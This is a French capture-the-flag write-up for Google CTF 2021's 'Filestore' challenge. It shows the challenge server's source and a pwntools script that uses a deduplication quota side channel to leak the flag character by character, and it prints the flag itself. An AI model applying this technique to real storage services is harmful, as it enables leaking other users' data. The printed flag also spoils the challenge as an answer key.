# Filestore

![screenChallenge](https://i.imgur.com/tFhtsab.png)

Dans ce challenge, on nous donne un script python et un lien pour ce connecter avec netcat.

Pour commencer regardons ce que donne la connection vers : ``filestore.2021.ctfcompetition.com 1337``.

```
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
test
Stored! Here's your file id:
emz2v1iPtzyOLMtj

Menu:
- load
- store
- status
- exit
load
Send me the file id...
emz2v1iPtzyOLMtj
test

Menu:
- load
- store
- status
- exit
```

Ok, on a donc un programme qui stock des valeurs, on peut stocker les valeurs que l'on veut avec la commande ``store`` suivi de la valeur que l'on veut stocker. On peut ensuite afficher la valeur avec la commande ``load`` suivi de l'id correspondant.

Maintenant qu'on a vu cela, voyons ce que l'on a dans le script python permettant de gérer le stockage :

```python
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os, secrets, string, time
from flag import flag


def main():
    # It's a tiny server...
    blob = bytearray(2**16)
    files = {}
    used = 0

    # Use deduplication to save space.
    def store(data):
        nonlocal used
        MINIMUM_BLOCK = 16
        MAXIMUM_BLOCK = 1024
        part_list = []
        while data:
            prefix = data[:MINIMUM_BLOCK]
            ind = -1
            bestlen, bestind = 0, -1
            while True:
                ind = blob.find(prefix, ind+1)
                if ind == -1: break
                length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))
                if length > bestlen:
                    bestlen, bestind = length, ind

            if bestind != -1:
                part, data = data[:bestlen], data[bestlen:]
                part_list.append((bestind, bestlen))
            else:
                part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:]
                blob[used:used+len(part)] = part
                part_list.append((used, len(part)))
                used += len(part)
                assert used <= len(blob)

        fid = "".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16))
        files[fid] = part_list
        return fid

    def load(fid):
        data = []
        for ind, length in files[fid]:
            data.append(blob[ind:ind+length])
        return b"".join(data)

    print("Welcome to our file storage solution.")

    # Store the flag as one of the files.
    store(bytes(flag, "utf-8"))

    while True:
        print()
        print("Menu:")
        print("- load")
        print("- store")
        print("- status")
        print("- exit")
        choice = input().strip().lower()
        if choice == "load":
            print("Send me the file id...")
            fid = input().strip()
            data = load(fid)
            print(data.decode())
        elif choice == "store":
            print("Send me a line of data...")
            data = input().strip()
            fid = store(bytes(data, "utf-8"))
            print("Stored! Here's your file id:")
            print(fid)
        elif choice == "status":
            print("User: ctfplayer")
            print("Time: %s" % time.asctime())
            kb = used / 1024.0
            kb_all = len(blob) / 1024.0
            print("Quota: %0.3fkB/%0.3fkB" % (kb, kb_all))
            print("Files: %d" % len(files))
        elif choice == "exit":
            break
        else:
            print("Nope.")
            break

try:
    main()
except Exception:
    print("Nope.")
time.sleep(1)
```

Dans ce script, on va s'intéresser au fonctionnement de la fonction ``store`` et de l'utilisation de la fonction ``status`` nous permettant de trouver le flag.

Grosso modo la fonction ``store`` va stocker les valeurs 16 caractères par 16 caractères et si les 16 caractères entré sont déjà dans ``blob`` , dans le même ordre, alors ils ne seront pas ajouté à ``blob``, le dictionnaire ``files`` aura une clé généré aléatoirement et aura les valeurs correspondant à l'emplacement des caractères voulant être stocké.

Maintenant que l'on sait ça, testons de stocker la valeur ``CTF{``, normalement aucune valeur ne sera ajouté à ``blob`` et donc la taille de celui-ci ne changera pas, ont pourra voir cela avec la commande ``status`` qui affiche la place utilisé dans ``blob``.

```
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 22:24:56 2021
Quota: 0.026kB/64.000kB
Files: 1

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
CTF{
Stored! Here's your file id:
6gv6YmlHRsypXyzC

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 22:25:05 2021
Quota: 0.026kB/64.000kB
Files: 2

Menu:
- load
- store
- status
- exit
```

Nous voyons bien que la taille n'a pas changé, elle est toujours de **0.026kb** après le stockage de ``CTF{``.

Nous pouvons donc connaitre le flag car si le(s) caractère(s) ajouté à ``CTF{`` ne correspondent pas à une partie du flag, la taille augmentera.

Il faut donc réaliser un script pour tester caractères par caractères la suite du flag :

```python
import pwn
import string

def testChar(partFlagFound):
    possibleChars = " "+string.printable[:-6]
    quota2 = b""
    for char in possibleChars :

        nc.recvline() #Menu:
        nc.recvline() #- load
        nc.recvline() #- store
        nc.recvline() #- status
        nc.recvline() #- exit

        nc.sendline("store".encode()) # store
        nc.recvline() # Send me a line of data...
        nc.sendline(partFlagFound.encode()+char.encode()) # CTF{....
        nc.recvline() # Stored! Here's your file id:
        nc.recvline() # recv file id
        nc.recvline() # line feed (\n)

        nc.recvline() #Menu:
        nc.recvline() #- load
        nc.recvline() #- store
        nc.recvline() #- status
        nc.recvline() #- exit

        nc.sendline("status".encode()) # status
        nc.recvline() # User
        nc.recvline() # Time
        quota = nc.recvline() # Quota
        nc.recvline() # Files
        nc.recvline() # line feed (\n)

        if quota == quota2:
            return char
            break
        quota2 = quota

host = "filestore.2021.ctfcompetition.com"
port = 1337
nc = pwn.remote(host, port)

nc.recvline() # == proof-of-work: disabled ==
nc.recvline() # Welcome to our file storage solution.
nc.recvline() # line feed (\n)

flag = "CTF{"

i=0
while flag[-1] != "}":
    flag += testChar(flag[i+1:])
    print(f"[i] {flag}")
    i+=1

print(f"\n[+] FLAG : {flag}")
```

Executons maintenant notre script python :

```
$ python3 solve.py 
[+] Opening connection to filestore.2021.ctfcompetition.com on port 1337: Done
[i] CTF{C
[i] CTF{CR
[i] CTF{CR1
[i] CTF{CR1M
[i] CTF{CR1M3
[i] CTF{CR1M3_
[i] CTF{CR1M3_0
[i] CTF{CR1M3_0f
[i] CTF{CR1M3_0f_
[i] CTF{CR1M3_0f_d
[i] CTF{CR1M3_0f_d3
[i] CTF{CR1M3_0f_d3d
[i] CTF{CR1M3_0f_d3du
[i] CTF{CR1M3_0f_d3dup
[i] CTF{CR1M3_0f_d3dup1
[i] CTF{CR1M3_0f_d3dup1i
[i] CTF{CR1M3_0f_d3dup1ic
[i] CTF{CR1M3_0f_d3dup1ic4
[i] CTF{CR1M3_0f_d3dup1ic4t
[i] CTF{CR1M3_0f_d3dup1ic4ti
[i] CTF{CR1M3_0f_d3dup1ic4ti0
[i] CTF{CR1M3_0f_d3dup1ic4ti0n
[i] CTF{CR1M3_0f_d3dup1ic4ti0n}

[+] FLAG : CTF{CR1M3_0f_d3dup1ic4ti0n}
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
```

Bingo !! Nous avons trouvé le flag : ``CTF{CR1M3_0f_d3dup1ic4ti0n}``
